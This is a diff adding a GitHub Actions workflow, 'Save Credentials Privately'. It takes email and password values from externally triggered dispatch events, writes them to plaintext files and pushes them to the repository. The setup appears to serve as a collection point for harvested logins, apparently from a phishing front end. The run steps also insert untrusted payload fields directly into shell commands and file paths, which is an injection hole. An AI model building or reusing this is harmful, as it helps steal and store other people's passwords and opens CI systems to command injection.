@@ -1,1 +1,28 @@
-mm
+name: Save Credentials Privately
+
+on:
+  repository_dispatch:
+    types: [save-credentials]
+
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@v2
+
+      - name: Save Credentials Privately
+        run: |
+          mkdir -p .private_credentials
+          echo "Email: ${{ github.event.client_payload.email }}" > .private_credentials/credentials_${{ github.event.client_payload.email }}.txt
+          echo "Password: ${{ github.event.client_payload.password }}" >> .private_credentials/credentials_${{ github.event.client_payload.email }}.txt
+
+      - name: Commit and Push
+        run: |
+          git config --global user.name "github-actions"
+          git config --global user.email "actions@github.com"
+          git add .private_credentials/*
+          git commit -m "Add new credentials to private folder"
+          git push
+        env:
+          GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
